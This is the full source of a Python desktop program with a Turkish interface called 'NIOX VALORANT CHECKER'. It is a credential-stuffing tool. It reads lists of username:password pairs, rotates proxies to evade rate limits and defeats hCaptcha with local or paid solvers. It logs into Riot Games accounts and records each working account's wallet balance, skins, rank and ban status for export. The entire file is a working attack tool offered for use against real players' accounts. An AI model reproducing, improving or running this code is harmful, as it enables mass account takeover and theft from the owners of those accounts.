import sys
import json
import time
import threading
import requests
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
from datetime import datetime
import base64
import re
import random
from concurrent.futures import ThreadPoolExecutor

# ============ RENK PALETI ============
BG_COLOR = "#0a0a0f"
SECONDARY_BG = "#12121a"
CARD_BG = "#1a1a28"
FG_COLOR = "#e8e8f0"
ACCENT_COLOR = "#ff4655"
ACCENT_HOVER = "#ff6b75"
SUCCESS_COLOR = "#00ff88"
WARN_COLOR = "#ffaa00"
ERROR_COLOR = "#ff4444"
ENTRY_BG = "#0f0f18"
ENTRY_FG = "#ffffff"
BORDER_COLOR = "#2a2a3d"

# ============ RIOT API ============
class RiotAPI:
    AUTH_URL = "https://auth.riotgames.com/authorize"
    ENTITLEMENTS_URL = "https://entitlements.auth.riotgames.com/api/token/v1"
    USERINFO_URL = "https://auth.riotgames.com/userinfo"
    GEO_URL = "https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant"
    RESTRICTIONS_URL = "https://riot-geo.pas.si.riotgames.com/restrictions/v3/player"
    
    CLIENT_ID = "play-valorant-web-prod"
    REDIRECT_URI = "https://playvalorant.com/opt_in"
    HCAPTCHA_SITEKEY = "d5e2a236-2b09-4b3e-bb6a-8a1e4f0e2d5a"
    
    SHARD_MAP = {
        "EU": "eu", "EUW": "eu", "EUNE": "eu", "TR": "eu",
        "NA": "na", "US": "na", "CA": "na",
        "AP": "ap", "JP": "ap", "SG": "ap",
        "KR": "kr", "BR": "br", "LATAM": "na"
    }
    
    @staticmethod
    def get_shard(region_code):
        return RiotAPI.SHARD_MAP.get(region_code.upper(), "eu")

# ============ PROXY YONETICI ============
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def load_proxies(self, proxy_list):
        self.proxies = []
        for proxy in proxy_list:
            proxy = proxy.strip()
            if not proxy:
                continue
            
            # Format: ip:port:user:pass veya ip:port
            parts = proxy.split(":")
            if len(parts) == 2:
                self.proxies.append({
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                })
            elif len(parts) == 4:
                ip, port, user, pwd = parts
                proxy_str = f"http://{user}:{pwd}@{ip}:{port}"
                self.proxies.append({
                    "http": proxy_str,
                    "https": proxy_str
                })
            elif len(parts) == 3:
                ip, port, user = parts
                proxy_str = f"http://{user}@{ip}:{port}"
                self.proxies.append({
                    "http": proxy_str,
                    "https": proxy_str
                })
        
        return len(self.proxies)
    
    def get_next(self):
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def get_random(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def test_proxy(self, proxy):
        try:
            response = requests.get(
                "https://httpbin.org/ip",
                proxies=proxy,
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

# ============ CAPTCHA SOLVER ============
class CaptchaSolver:
    YESCAPTCHA_URL = "https://api.yescaptcha.com/createTask"
    LOCAL_URL = "http://127.0.0.1:8000/api/solve"
    
    def __init__(self, api_key=None):
        self.api_key = api_key
    
    def solve(self):
        # Try local first
        try:
            response = requests.post(
                self.LOCAL_URL,
                json={"sitekey": RiotAPI.HCAPTCHA_SITEKEY},
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if data.get("captcha_key"):
                    return data["captcha_key"]
        except:
            pass
        
        # Cloud fallback
        if self.api_key:
            try:
                payload = {
                    "clientKey": self.api_key,
                    "task": {
                        "type": "HCaptchaTaskProxyless",
                        "websiteURL": "https://auth.riotgames.com/login",
                        "websiteKey": RiotAPI.HCAPTCHA_SITEKEY
                    }
                }
                response = requests.post(self.YESCAPTCHA_URL, json=payload, timeout=60)
                if response.status_code == 200:
                    return response.json().get("solution", {}).get("gRecaptchaResponse")
            except:
                pass
        
        return None

# ============ VALORANT CHECKER ============
class ValorantChecker:
    def __init__(self, proxy_manager=None, captcha_api_key=None):
        self.proxy_manager = proxy_manager
        self.captcha_solver = CaptchaSolver(captcha_api_key)
    
    def create_session(self, use_proxy=True):
        session = requests.Session()
        
        if use_proxy and self.proxy_manager:
            proxy = self.proxy_manager.get_next()
            if proxy:
                session.proxies.update(proxy)
        
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Content-Type": "application/json",
            "Origin": "https://auth.riotgames.com",
            "Referer": "https://auth.riotgames.com/"
        })
        
        return session
    
    def check_account(self, username, password, use_proxy=True):
        result = {
            "username": username,
            "password": password,
            "status": "FAILED",
            "reason": "",
            "proxy_used": "Hayır",
            "info": {}
        }
        
        session = self.create_session(use_proxy)
        
        if use_proxy and self.proxy_manager:
            current_proxy = session.proxies.get("http", "")
            if current_proxy:
                result["proxy_used"] = current_proxy.split("//")[1].split("@")[-1]
        
        try:
            # 1. Auth baslat
            auth_params = {
                "client_id": RiotAPI.CLIENT_ID,
                "redirect_uri": RiotAPI.REDIRECT_URI,
                "response_type": "token id_token",
                "scope": "openid account",
                "nonce": str(int(time.time() * 1000000))
            }
            
            session.get(RiotAPI.AUTH_URL, params=auth_params, timeout=15)
            
            # 2. Login dene
            login_payload = {
                "type": "auth",
                "username": username,
                "password": password,
                "remember": True,
                "language": "tr_TR"
            }
            
            login_response = session.put(RiotAPI.AUTH_URL, json=login_payload, timeout=15)
            
            # 3. Rate limit / captcha kontrol
            if login_response.status_code == 429:
                result["reason"] = "CAPTCHA gerekli"
                
                captcha_key = self.captcha_solver.solve()
                if captcha_key:
                    login_payload["captcha_key"] = captcha_key
                    login_payload["type"] = "captcha"
                    login_response = session.put(RiotAPI.AUTH_URL, json=login_payload, timeout=15)
                else:
                    result["reason"] = "CAPTCHA çözülemedi"
                    return result
            
            # 4. Auth failure
            if login_response.status_code == 401:
                result["reason"] = "Yanlış kullanıcı adı veya şifre"
                return result
            
            if login_response.status_code == 403:
                result["reason"] = "Hesap kilitli"
                return result
            
            if login_response.status_code != 200:
                result["reason"] = f"Login hatası (HTTP {login_response.status_code})"
                return result
            
            # 5. Token al
            response_data = login_response.json()
            access_token = response_data.get("access_token")
            
            if not access_token:
                # URI fragment'tan token parse
                uri = response_data.get("response", "")
                token_match = re.search(r'access_token=([^&]+)', uri)
                if token_match:
                    access_token = token_match.group(1)
                else:
                    result["reason"] = "Token alınamadı"
                    return result
            
            # 6. User info
            session.headers["Authorization"] = f"Bearer {access_token}"
            user_response = session.get(RiotAPI.USERINFO_URL, timeout=10)
            
            if user_response.status_code != 200:
                result["reason"] = "User info alınamadı"
                return result
            
            user_data = user_response.json()
            puuid = user_data.get("sub")
            
            if not puuid:
                result["reason"] = "PUUID alınamadı"
                return result
            
            # 7. Entitlements token
            entitlements_token = ""
            ent_response = session.post(RiotAPI.ENTITLEMENTS_URL, timeout=10)
            if ent_response.status_code == 200:
                entitlements_token = ent_response.json().get("entitlements_token", "")
            
            # 8. Region
            shard = "eu"
            geo_response = session.get(RiotAPI.GEO_URL, timeout=10)
            if geo_response.status_code == 200:
                region = geo_response.json().get("region", "EU")
                shard = RiotAPI.get_shard(region)
                result["region"] = region
            
            # 9. Account info
            api_headers = {
                "Authorization": f"Bearer {access_token}",
                "X-Riot-Entitlements-JWT": entitlements_token,
                "User-Agent": "RiotClient/63.0.0.1234567.1234567 (Windows;10;;Professional, x64)"
            }
            
            base_url = f"https://pd.{shard}.a.pvp.net"
            
            info = {}
            
            # Level
            try:
                r = session.get(f"{base_url}/account-xp/v1/players/{puuid}", headers=api_headers, timeout=10)
                if r.status_code == 200:
                    info["level"] = r.json().get("Progress", {}).get("Level", 0)
            except:
                info["level"] = 0
            
            # Wallet
            try:
                r = session.get(f"{base_url}/store/v1/wallet/{puuid}", headers=api_headers, timeout=10)
                if r.status_code == 200:
                    balances = r.json().get("Balances", {})
                    info["vp"] = balances.get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", 0)
                    info["rp"] = balances.get("e59aa87c-4cbf-517a-5983-6e81511be9b7", 0)
            except:
                info["vp"] = 0
                info["rp"] = 0
            
            # Skins
            try:
                r = session.get(
                    f"{base_url}/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",
                    headers=api_headers, timeout=10
                )
                if r.status_code == 200:
                    info["skins"] = len(r.json().get("Entitlements", []))
            except:
                info["skins"] = 0
            
            # MMR
            try:
                r = session.get(f"{base_url}/mmr/v1/players/{puuid}", headers=api_headers, timeout=10)
                if r.status_code == 200:
                    mmr_data = r.json()
                    info["rank"] = mmr_data.get("LatestCompetitiveUpdate", {}).get("TierAfterUpdate", 0)
                    info["rr"] = mmr_data.get("LatestCompetitiveUpdate", {}).get("RankedRatingAfterUpdate", 0)
            except:
                info["rank"] = 0
                info["rr"] = 0
            
            # Ban
            try:
                r = session.get(RiotAPI.RESTRICTIONS_URL, headers=api_headers, timeout=10)
                if r.status_code == 200:
                    penalties = r.json().get("penalties", [])
                    info["banned"] = len(penalties) > 0
                    info["ban_reason"] = penalties[0].get("reason", "") if penalties else ""
            except:
                info["banned"] = False
            
            result["status"] = "SUCCESS"
            result["info"] = info
            result["puuid"] = puuid
            
            return result
            
        except requests.exceptions.ProxyError:
            result["reason"] = "Proxy hatası"
            return result
        except requests.exceptions.Timeout:
            result["reason"] = "Zaman aşımı"
            return result
        except Exception as e:
            result["reason"] = f"Hata: {str(e)[:50]}"
            return result

# ============ SIKI GUI ============
class ValorantCheckerGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("NIOX VALORANT CHECKER v2.0")
        self.root.geometry("950x700")
        self.root.configure(bg=BG_COLOR)
        self.root.resizable(True, True)
        
        # Vars
        self.checker = None
        self.proxy_manager = ProxyManager()
        self.running = False
        self.stop_requested = False
        self.total_checked = 0
        self.success_count = 0
        self.fail_count = 0
        
        self.setup_styles()
        self.setup_ui()
    
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use("clam")
        
        style.configure(
            "Treeview",
            background=CARD_BG,
            fieldbackground=CARD_BG,
            foreground=FG_COLOR,
            rowheight=30,
            borderwidth=0,
            font=("Consolas", 10)
        )
        style.configure(
            "Treeview.Heading",
            background=SECONDARY_BG,
            foreground=ACCENT_COLOR,
            font=("Arial", 10, "bold"),
            borderwidth=0
        )
        style.map(
            "Treeview",
            background=[("selected", ACCENT_COLOR)],
            foreground=[("selected", "white")]
        )
        
        style.configure(
            "Horizontal.TProgressbar",
            background=ACCENT_COLOR,
            troughcolor=SECONDARY_BG,
            bordercolor=BG_COLOR,
            lightcolor=ACCENT_COLOR,
            darkcolor=ACCENT_COLOR
        )
    
    def create_card(self, parent, title):
        card = tk.Frame(parent, bg=SECONDARY_BG, highlightbackground=BORDER_COLOR, highlightthickness=1)
        
        title_label = tk.Label(
            card, text=title,
            bg=SECONDARY_BG, fg=ACCENT_COLOR,
            font=("Arial", 11, "bold")
        )
        title_label.pack(anchor="w", padx=10, pady=5)
        
        return card
    
    def setup_ui(self):
        # ============ HEADER ============
        header = tk.Frame(self.root, bg=BG_COLOR)
        header.pack(fill=tk.X, padx=20, pady=(20, 10))
        
        title_frame = tk.Frame(header, bg=BG_COLOR)
        title_frame.pack(side=tk.LEFT)
        
        tk.Label(
            title_frame, text="NIOX",
            bg=BG_COLOR, fg=ACCENT_COLOR,
            font=("Arial", 28, "bold")
        ).pack(anchor="w")
        
        tk.Label(
            title_frame, text="VALORANT CHECKER",
            bg=BG_COLOR, fg=FG_COLOR,
            font=("Arial", 12)
        ).pack(anchor="w")
        
        # Stats
        stats_frame = tk.Frame(header, bg=BG_COLOR)
        stats_frame.pack(side=tk.RIGHT)
        
        self.total_label = tk.Label(
            stats_frame, text=f"Toplam: 0",
            bg=BG_COLOR, fg=FG_COLOR,
            font=("Arial", 10)
        )
        self.total_label.pack(side=tk.LEFT, padx=10)
        
        self.success_label = tk.Label(
            stats_frame, text=f"Başarılı: 0",
            bg=BG_COLOR, fg=SUCCESS_COLOR,
            font=("Arial", 10, "bold")
        )
        self.success_label.pack(side=tk.LEFT, padx=10)
        
        self.fail_label = tk.Label(
            stats_frame, text=f"Başarısız: 0",
            bg=BG_COLOR, fg=ERROR_COLOR,
            font=("Arial", 10, "bold")
        )
        self.fail_label.pack(side=tk.LEFT, padx=10)
        
        # ============ SOL PANEL ============
        left_panel = tk.Frame(self.root, bg=BG_COLOR)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(20, 10), pady=10)
        
        # API Key Card
        api_card = self.create_card(left_panel, "CAPTCHA AYARLARI")
        api_card.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(
            api_card, text="YesCaptcha API Key:",
            bg=SECONDARY_BG, fg=FG_COLOR,
            font=("Arial", 9)
        ).pack(anchor="w", padx=10)
        
        self.api_entry = tk.Entry(
            api_card, width=35,
            bg=ENTRY_BG, fg=ENTRY_FG,
            insertbackground=ENTRY_FG,
            font=("Consolas", 10),
            relief=tk.FLAT
        )
        self.api_entry.pack(padx=10, pady=(5, 10), fill=tk.X)
        
        # Proxy Card
        proxy_card = self.create_card(left_panel, "PROXY AYARLARI")
        proxy_card.pack(fill=tk.X, pady=(0, 10))
        
        self.use_proxy_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            proxy_card, text="Proxy kullan",
            variable=self.use_proxy_var,
            bg=SECONDARY_BG, fg=FG_COLOR,
            selectcolor=ENTRY_BG,
            activebackground=SECONDARY_BG,
            activeforeground=FG_COLOR,
            font=("Arial", 10)
        ).pack(anchor="w", padx=10, pady=5)
        
        self.proxy_text = scrolledtext.ScrolledText(
            proxy_card, width=35, height=8,
            bg=ENTRY_BG, fg=ENTRY_FG,
            font=("Consolas", 9),
            insertbackground=ENTRY_FG,
            relief=tk.FLAT
        )
        self.proxy_text.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)
        
        btn_frame = tk.Frame(proxy_card, bg=SECONDARY_BG)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(
            btn_frame, text="YÜKLE",
            command=self.load_proxies,
            bg="#2a2a3d", fg=FG_COLOR,
            font=("Arial", 9, "bold"),
            padx=10, pady=3,
            cursor="hand2",
            relief=tk.FLAT
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            btn_frame, text="TEST",
            command=self.test_proxies,
            bg="#2a2a3d", fg=FG_COLOR,
            font=("Arial", 9, "bold"),
            padx=10, pady=3,
            cursor="hand2",
            relief=tk.FLAT
        ).pack(side=tk.LEFT, padx=2)
        
        self.proxy_status = tk.Label(
            proxy_card, text="Proxy: 0 yüklü",
            bg=SECONDARY_BG, fg=WARN_COLOR,
            font=("Arial", 9)
        )
        self.proxy_status.pack(anchor="w", padx=10, pady=(0, 5))
        
        # ============ SAG PANEL ============
        right_panel = tk.Frame(self.root, bg=BG_COLOR)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 20), pady=10)
        
        # Hesap Card
        account_card = self.create_card(right_panel, "HESAP LİSTESİ (kullanıcı:şifre)")
        account_card.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.account_text = scrolledtext.ScrolledText(
            account_card, width=50, height=15,
            bg=ENTRY_BG, fg=ENTRY_FG,
            font=("Consolas", 10),
            insertbackground=ENTRY_FG,
            relief=tk.FLAT
        )
        self.account_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Kontrol Butonlari
        control_frame = tk.Frame(right_panel, bg=BG_COLOR)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_btn = tk.Button(
            control_frame, text="▶ CHECK BAŞLAT",
            command=self.start_check,
            bg=ACCENT_COLOR, fg="white",
            font=("Arial", 12, "bold"),
            padx=20, pady=10,
            cursor="hand2",
            relief=tk.FLAT,
            activebackground=ACCENT_HOVER,
            activeforeground="white"
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_btn = tk.Button(
            control_frame, text="■ DURDUR",
            command=self.stop_check,
            bg=ERROR_COLOR, fg="white",
            font=("Arial", 12, "bold"),
            padx=20, pady=10,
            cursor="hand2",
            relief=tk.FLAT,
            state="disabled"
        )
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        self.export_btn = tk.Button(
            control_frame, text="💾 KAYDET",
            command=self.export_results,
            bg="#00aa55", fg="white",
            font=("Arial", 10, "bold"),
            padx=15, pady=5,
            cursor="hand2",
            relief=tk.FLAT
        )
        self.export_btn.pack(side=tk.RIGHT)
        
        # Progress
        progress_frame = tk.Frame(right_panel, bg=BG_COLOR)
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.progress = ttk.Progressbar(
            progress_frame, length=600, mode="determinate"
        )
        self.progress.pack(fill=tk.X)
        
        self.status_label = tk.Label(
            progress_frame, text="HAZIR",
            bg=BG_COLOR, fg=WARN_COLOR,
            font=("Arial", 10, "bold")
        )
        self.status_label.pack(anchor="w", pady=(5, 0))
        
        # Sonuclar
        results_card = self.create_card(right_panel, "SONUÇLAR")
        results_card.pack(fill=tk.BOTH, expand=True)
        
        columns = ("#", "username", "status", "level", "rank", "vp", "rp", "skins", "ban", "proxy")
        self.tree = ttk.Treeview(results_card, columns=columns, show="headings", height=12)
        
        headers = {
            "#": "#",
            "username": "Kullanıcı",
            "status": "Durum",
            "level": "Level",
            "rank": "Rank",
            "vp": "VP",
            "rp": "RP",
            "skins": "Skins",
            "ban": "Ban",
            "proxy": "Proxy"
        }
        
        widths = {
            "#": 35,
            "username": 120,
            "status": 60,
            "level": 50,
            "rank": 80,
            "vp": 50,
            "rp": 50,
            "skins": 50,
            "ban": 40,
            "proxy": 100
        }
        
        for col in columns:
            self.tree.heading(col, text=headers[col])
            self.tree.column(col, width=widths[col], anchor="center")
        
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Taglar
        self.tree.tag_configure("success", foreground=SUCCESS_COLOR)
        self.tree.tag_configure("failed", foreground=ERROR_COLOR)
        self.tree.tag_configure("banned", foreground=WARN_COLOR)
    
    def load_proxies(self):
        filename = filedialog.askopenfilename(
            title="Proxy Listesi Seç",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if not filename:
            return
        
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read()
        
        self.proxy_text.delete("1.0", tk.END)
        self.proxy_text.insert("1.0", content)
        
        count = self.proxy_manager.load_proxies(content.split("\n"))
        self.proxy_status.config(text=f"Proxy: {count} yüklü", fg=SUCCESS_COLOR if count > 0 else ERROR_COLOR)
    
    def test_proxies(self):
        proxy_text = self.proxy_text.get("1.0", tk.END).strip()
        if not proxy_text:
            messagebox.showwarning("Uyarı", "Proxy listesi boş!")
            return
        
        self.proxy_manager.load_proxies(proxy_text.split("\n"))
        total = len(self.proxy_manager.proxies)
        
        self.proxy_status.config(text=f"Proxy test ediliyor... 0/{total}", fg=WARN_COLOR)
        
        def test_thread():
            working = 0
            for i, proxy in enumerate(self.proxy_manager.proxies):
                if self.proxy_manager.test_proxy(proxy):
                    working += 1
                self.root.after(0, lambda idx=i: self.proxy_status.config(
                    text=f"Proxy test: {idx+1}/{total} - Çalışan: {working}",
                    fg=WARN_COLOR
                ))
            
            self.root.after(0, lambda: self.proxy_status.config(
                text=f"Proxy: {total} yüklü - {working} çalışıyor",
                fg=SUCCESS_COLOR if working > 0 else ERROR_COLOR
            ))
        
        threading.Thread(target=test_thread, daemon=True).start()
    
    def start_check(self):
        if self.running:
            return
        
        account_text = self.account_text.get("1.0", tk.END).strip()
        if not account_text:
            messagebox.showwarning("Uyarı", "Hesap listesi boş!")
            return
        
        # Proxy load
        proxy_text = self.proxy_text.get("1.0", tk.END).strip()
        if proxy_text:
            self.proxy_manager.load_proxies(proxy_text.split("\n"))
        
        api_key = self.api_entry.get().strip()
        
        self.accounts = []
        for line in account_text.split("\n"):
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    self.accounts.append((parts[0].strip(), parts[1].strip()))
        
        if not self.accounts:
            messagebox.showwarning("Uyarı", "Geçerli hesap bulunamadı!")
            return
        
        self.checker = ValorantChecker(self.proxy_manager, api_key if api_key else None)
        
        # Reset
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        self.total_checked = 0
        self.success_count = 0
        self.fail_count = 0
        self.stop_requested = False
        self.running = True
        
        self.progress["maximum"] = len(self.accounts)
        self.progress["value"] = 0
        
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        
        threading.Thread(target=self.check_thread, daemon=True).start()
    
    def stop_check(self):
        self.stop_requested = True
        self.status_label.config(text="DURDURULUYOR...", fg=ERROR_COLOR)
    
    def check_thread(self):
        for i, (username, password) in enumerate(self.accounts):
            if self.stop_requested:
                break
            
            self.root.after(0, lambda u=username: self.status_label.config(
                text=f"KONTROL EDİLİYOR: {u}",
                fg=WARN_COLOR
            ))
            
            use_proxy = self.use_proxy_var.get()
            result = self.checker.check_account(username, password, use_proxy)
            
            self.total_checked += 1
            if result["status"] == "SUCCESS":
                self.success_count += 1
            else:
                self.fail_count += 1
            
            info = result.get("info", {})
            status = "✓" if result["status"] == "SUCCESS" else "✗"
            banned = "Evet" if info.get("banned") else "Hayır"
            
            rank_map = {
                0: "Unranked", 3: "Iron 1", 4: "Iron 2", 5: "Iron 3",
                6: "Bronze 1", 7: "Bronze 2", 8: "Bronze 3",
                9: "Silver 1", 10: "Silver 2", 11: "Silver 3",
                12: "Gold 1", 13: "Gold 2", 14: "Gold 3",
                15: "Plat 1", 16: "Plat 2", 17: "Plat 3",
                18: "Diamond 1", 19: "Diamond 2", 20: "Diamond 3",
                21: "Immortal 1", 22: "Immortal 2", 23: "Immortal 3",
                24: "Radiant"
            }
            
            rank_str = rank_map.get(info.get("rank", 0), "Unranked")
            
            tag = "success" if result["status"] == "SUCCESS" else "failed"
            if banned == "Evet":
                tag = "banned"
            
            self.root.after(0, lambda idx=i+1, u=username, s=status, lvl=info.get("level", 0), 
                           rnk=rank_str, vp=info.get("vp", 0), rp=info.get("rp", 0),
                           sk=info.get("skins", 0), b=banned, pr=result.get("proxy_used", "-"), t=tag: 
                self.tree.insert("", "end", values=(idx, u, s, lvl, rnk, vp, rp, sk, b, pr), tags=(t,)))
            
            self.root.after(0, lambda idx=i+1: self.progress.config(value=idx))
            self.root.after(0, lambda: self.update_stats())
            
            time.sleep(0.5)
        
        self.running = False
        self.root.after(0, lambda: self.start_btn.config(state="normal"))
        self.root.after(0, lambda: self.stop_btn.config(state="disabled"))
        
        if self.stop_requested:
            self.root.after(0, lambda: self.status_label.config(text="DURDURULDU", fg=ERROR_COLOR))
        else:
            self.root.after(0, lambda: self.status_label.config(text="TAMAMLANDI", fg=SUCCESS_COLOR))
    
    def update_stats(self):
        self.total_label.config(text=f"Toplam: {self.total_checked}")
        self.success_label.config(text=f"Başarılı: {self.success_count}")
        self.fail_label.config(text=f"Başarısız: {self.fail_count}")
    
    def export_results(self):
        if self.total_checked == 0:
            messagebox.showwarning("Uyarı", "Kaydedilecek sonuç yok!")
            return
        
        filename = filedialog.asksaveasfilename(
            title="Sonuçları Kaydet",
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt")]
        )
        if not filename:
            return
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("NIOX VALORANT CHECKER - SONUÇLAR\n")
            f.write(f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Toplam: {self.total_checked} | Başarılı: {self.success_count} | Başarısız: {self.fail_count}\n")
            f.write("=" * 60 + "\n\n")
            
            for item in self.tree.get_children():
                values = self.tree.item(item)["values"]
                f.write(f"[{values[0]}] {values[1]}\n")
                f.write(f"  Durum: {values[2]}\n")
                f.write(f"  Level: {values[3]}\n")
                f.write(f"  Rank: {values[4]}\n")
                f.write(f"  VP: {values[5]} | RP: {values[6]}\n")
                f.write(f"  Skins: {values[7]} | Ban: {values[8]}\n")
                f.write(f"  Proxy: {values[9]}\n")
                f.write("-" * 40 + "\n")
        
        messagebox.showinfo("Başarılı", f"Sonuçlar kaydedildi:\n{filename}")
    
    def run(self):
        self.root.mainloop()

# ============ MAIN ============
if __name__ == "__main__":
    gui = ValorantCheckerGUI()
    gui.run()